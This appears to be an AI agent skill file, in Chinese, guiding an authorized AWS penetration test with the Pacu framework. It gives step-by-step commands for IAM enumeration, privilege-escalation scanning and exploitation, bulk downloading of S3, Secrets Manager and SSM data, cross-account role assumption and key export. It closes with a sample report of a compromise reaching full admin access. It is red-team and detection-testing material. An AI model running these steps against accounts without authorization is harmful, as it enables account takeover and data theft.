---
name: cszh-performing-cloud-penetration-testing-with-pacu
description: 使用开源 AWS 利用框架 Pacu 执行已授权的 AWS 渗透测试，枚举 IAM 配置、发现权限提升路径、测试凭据收集，并通过系统化的攻击模拟验证安全控制。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 performing-cloud-penetration-testing-with-pacu），正文按中文原文照录。

**这个技能干什么**：使用开源 AWS 利用框架 Pacu 执行已授权的 AWS 渗透测试，枚举 IAM 配置、发现权限提升路径、测试凭据收集，并通过系统化的攻击模拟验证安全控制。

**什么时候用**：需要按上游中文方法论执行「performing-cloud-penetration-testing-with-pacu」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 使用 Pacu 执行云渗透测试

## 适用场景

- 对 AWS 环境进行已授权的渗透测试时
- 验证 IAM 策略、SCP 和权限边界的有效性时
- 评估一组受损 AWS 凭据的影响范围时
- 测试 GuardDuty、Security Hub 和自定义告警的检测能力时
- 针对 AWS 云基础设施构建红队演练（Red Teaming）时

**不适用于**：未授权的任何 AWS 账户测试、测试 AWS 基础设施本身（属于共同责任范畴）、未经 AWS 批准的 DDoS 或大规模攻击，或在没有明确授权和应急程序的情况下测试生产账户。

## 前置条件

- 已获取 AWS 账户所有者的书面授权，并定义了范围和交战规则
- 已安装 Pacu v1.5+（`pip install pacu`）
- 具有有限初始权限的测试 AWS 凭据（模拟凭据泄露场景）
- 已启用 CloudTrail 日志，用于捕获所有 Pacu 活动以供事后审查
- 已启用 GuardDuty，用于验证 Pacu 活动的检测情况
- 已记录紧急联系人和回滚程序

## 工作流程

### 步骤 1：初始化 Pacu 会话并配置凭据

使用测试凭据设置 Pacu 会话，并定义测试范围。

```bash
# 安装 Pacu
pip install pacu

# 启动 Pacu
pacu

# 为本次测试创建新会话
Pacu > set_keys --key-alias pentest-target
# 输入 Access Key ID: AKIA...
# 输入 Secret Access Key: ...

# 验证身份
Pacu > whoami

# 查看可用模块
Pacu > list
Pacu > search iam
Pacu > search ec2
Pacu > search s3
```

### 步骤 2：枚举 IAM 配置

运行 IAM 枚举模块，映射用户、角色、策略和组成员关系。

```bash
# 全面 IAM 枚举
Pacu > run iam__enum_users_roles_policies_groups

# 枚举当前主体的详细权限
Pacu > run iam__enum_permissions

# 枚举账户授权详情（需要 iam:GetAccountAuthorizationDetails）
Pacu > run iam__get_credential_report

# 枚举跨账户访问的角色信任策略
Pacu > run iam__enum_roles

# 检查当前会话数据
Pacu > data iam
```

### 步骤 3：扫描权限提升路径

使用 Pacu 的权限提升扫描器识别所有可利用的提升向量。

```bash
# 运行权限提升扫描器
Pacu > run iam__privesc_scan

# 扫描器测试 21+ 种提升方法：
# 方法 1:  iam:CreatePolicyVersion
# 方法 2:  iam:SetDefaultPolicyVersion
# 方法 3:  iam:PassRole + ec2:RunInstances
# 方法 4:  iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# 方法 5:  iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping
# 方法 6:  iam:PassRole + glue:CreateDevEndpoint
# 方法 7:  iam:PassRole + cloudformation:CreateStack
# 方法 8:  iam:PassRole + datapipeline:CreatePipeline
# 方法 9:  iam:CreateAccessKey
# 方法 10: iam:CreateLoginProfile
# 方法 11: iam:UpdateLoginProfile
# 方法 12: iam:AttachUserPolicy
# 方法 13: iam:AttachGroupPolicy
# 方法 14: iam:AttachRolePolicy
# 方法 15: iam:PutUserPolicy
# 方法 16: iam:PutGroupPolicy
# 方法 17: iam:PutRolePolicy
# 方法 18: iam:AddUserToGroup
# 方法 19: iam:UpdateAssumeRolePolicy
# 方法 20: sts:AssumeRole
# 方法 21: lambda:UpdateFunctionCode

# 如果发现提升路径，尝试利用
Pacu > run iam__privesc_scan --escalate
```

### 步骤 4：枚举并测试数据访问

发现可访问的数据存储，包括 S3、DynamoDB、RDS 和 Secrets Manager。

```bash
# 枚举 S3 存储桶
Pacu > run s3__bucket_finder

# 下载 S3 存储桶数据进行分析
Pacu > run s3__download_bucket --bucket target-bucket --dl-names

# 枚举 EC2 实例并提取用户数据
Pacu > run ec2__enum
Pacu > run ec2__download_userdata

# 枚举 Lambda 函数，检查环境变量中的密钥
Pacu > run lambda__enum

# 枚举 Secrets Manager
Pacu > run secretsmanager__enum

# 枚举 SSM 参数（通常包含密钥）
Pacu > run ssm__download_parameters

# 检查暴露的 EBS 快照
Pacu > run ebs__enum_snapshots_unauth
```

### 步骤 5：测试横向移动和持久化

评估跨账户访问、服务利用和持久化机制。

```bash
# 测试跨账户角色担任
Pacu > run sts__assume_role --role-arn arn:aws:iam::TARGET:role/CrossAccountRole

# 枚举 Lambda 以寻找代码执行机会
Pacu > run lambda__enum
# 如果存在 lambda:UpdateFunctionCode 权限，可能注入代码

# 测试 EC2 instance connect 进行横向移动
Pacu > run ec2__enum
# 检查具有更广泛权限实例配置文件的实例

# 检查 CodeBuild 项目（潜在的凭据访问）
Pacu > run codebuild__enum

# 枚举 ECS/Fargate 进行基于容器的横向移动
Pacu > run ecs__enum

# 导出所有发现的数据
Pacu > data all
```

### 步骤 6：验证检测并生成报告

审查安全控制是否检测到测试活动，并汇总发现。

```bash
# 检查测试期间生成的 GuardDuty 发现
aws guardduty list-findings \
  --detector-id $(aws guardduty list-detectors --query 'DetectorIds[0]' --output text) \
  --finding-criteria '{
    "Criterion": {
      "updatedAt": {"GreaterThanOrEqual": ENGAGEMENT_START_EPOCH}
    }
  }' --output json

# 检查 Security Hub 发现
aws securityhub get-findings \
  --filters '{
    "CreatedAt": [{"Start": "ENGAGEMENT_START_ISO", "End": "ENGAGEMENT_END_ISO"}]
  }'

# 导出 Pacu 会话数据用于报告
Pacu > export_keys --all
Pacu > data all > pacu-session-export.json

# 清理评估期间创建的测试产物
aws iam delete-user --user-name pacu-test-user 2>/dev/null
aws iam delete-access-key --user-name pacu-test-user --access-key-id AKIA... 2>/dev/null
```

## 核心概念

| 术语 | 定义 |
|------|------|
| Pacu | 由 Rhino Security Labs 维护的开源 AWS 利用框架，为已授权渗透测试提供模块化攻击能力 |
| 权限提升扫描（Privilege Escalation Scan） | 对 IAM 策略进行自动化分析，识别将有限访问提升至管理控制的已知方法 |
| iam:PassRole | 关键 IAM 操作，允许主体为 AWS 服务分配角色，通过 Lambda、EC2 或 Glue 实现间接权限提升 |
| 跨账户角色担任（Cross-Account Role Assumption） | 通过信任策略配置使用 sts:AssumeRole 获取另一 AWS 账户的临时凭据 |
| 交战规则（Rules of Engagement） | 定义渗透测试范围、方法、时间和边界的书面协议 |
| 后渗透（Post-Exploitation） | 在获得初始访问后执行的活动，包括数据访问、横向移动和建立持久化 |

## 工具与系统

- **Pacu**：AWS 利用框架，拥有 50+ 个枚举、提升、持久化和数据外泄模块
- **CloudFox**：从攻击者角度识别攻击路径的 AWS 枚举工具
- **Principal Mapper**：IAM 权限提升图形分析工具，用于可视化提升路径
- **ScoutSuite**：多云安全评估工具，用于在测试前识别配置错误
- **AWS CloudTrail**：审计日志，用于捕获测试期间的所有 Pacu 活动

## 常见场景

### 场景：从受损开发者凭据开始的红队评估

**场景背景**：红队演练模拟攻击者从泄露的代码仓库获取开发者 AWS 访问密钥的场景。目标是确定从此起点可实现的最大影响。

**方法**：
1. 使用受损凭据初始化 Pacu，运行 `whoami` 确认身份
2. 运行 `iam__enum_permissions` 映射开发者的有效权限
3. 执行 `iam__privesc_scan` 识别从开发者到管理员的提升路径
4. 发现开发者可以调用 `iam:PassRole` + `lambda:CreateFunction`，创建带管理员角色的 Lambda
5. 利用提升获取管理员级别的临时凭据
6. 枚举 S3 存储桶、下载敏感数据并访问 Secrets Manager
7. 验证 GuardDuty 是否检测到提升和数据访问活动
8. 清理所有测试产物并记录完整攻击链

**常见陷阱**：Pacu 模块可能产生大量噪音，在短时间内生成许多 API 调用。GuardDuty 可能从测试者 IP 触发 `Recon:IAMUser/MaliciousIPCaller` 发现。与 SOC 团队协调，将测试 IP 加入白名单，或建立清晰的沟通渠道以区分测试和真实攻击。测试后务必清理持久化产物。

## 输出格式

```
AWS 渗透测试报告（Pacu）
=====================================
目标账户: 123456789012
测试周期: 2026-02-20 至 2026-02-23
起始凭据: 开发者角色（S3 只读、Lambda 调用）
授权: ROE 文件 #PT-2026-015

攻击路径摘要:
  初始访问: S3 只读、Lambda 调用
  最终获得访问: AdministratorAccess（完全账户入侵）
  获得管理员权限时间: 47 分钟
  GuardDuty 检测: 是（12 分钟后）
  Security Hub 检测: 是（18 分钟后）
  SOC 响应时间: 45 分钟（错过了提升窗口）

已执行的 Pacu 模块:
  iam__enum_users_roles_policies_groups: 成功
  iam__enum_permissions: 成功
  iam__privesc_scan: 发现 3 条提升路径
  s3__download_bucket: 访问了 4 个存储桶
  lambda__enum: 枚举了 12 个函数
  secretsmanager__enum: 获取了 8 个密钥

已利用的提升路径:
  [1] iam:PassRole + lambda:CreateFunction -> AdminRole（严重）
  [2] sts:AssumeRole -> CrossAccountProdRole（高）
  [3] dev-policy 上的 iam:CreatePolicyVersion（严重）

访问的数据:
  下载的 S3 对象: 1,247 个文件（2.3 GB）
  Secrets Manager 值: 8 个密钥，包括数据库凭据
  SSM 参数: 23 个参数，包括 API 密钥

检测结果:
  GuardDuty 发现: 7 个
  Security Hub 发现: 12 个
  触发的自定义 CloudWatch 告警: 3 个
  SOC 确认: 是（45 分钟响应）

建议:
  1. 对所有开发者角色应用权限边界
  2. 从非管理员主体移除 iam:PassRole
  3. 将 SOC 对 IAM 提升告警的响应时间缩短到 15 分钟以内
  4. 在非管理员 OU 中实施 SCP，阻止 iam:CreatePolicyVersion
```
